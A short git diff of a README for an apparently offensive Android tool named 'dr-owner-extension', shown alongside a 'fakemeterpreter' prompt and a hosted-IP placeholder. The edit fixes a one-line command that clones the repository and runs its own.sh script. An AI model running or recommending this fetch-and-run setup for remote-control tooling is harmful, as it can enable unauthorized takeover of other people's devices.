@@ -31,6 +31,6 @@ fakemeterpreter> [ PUT THE HOSTED IP HERE ]
 ## In the OWNER OF ANDROID HOSTED
 
 ```console
-pkg install git ; git clone https://ixzzxitado/dr-owner-extension ; cd dr-owner-extension ; bash own.sh
+pkg install git ; git clone https://github.com/ixzzxitado/dr-owner-extension ; cd dr-owner-extension ; bash own.sh
 ```
 
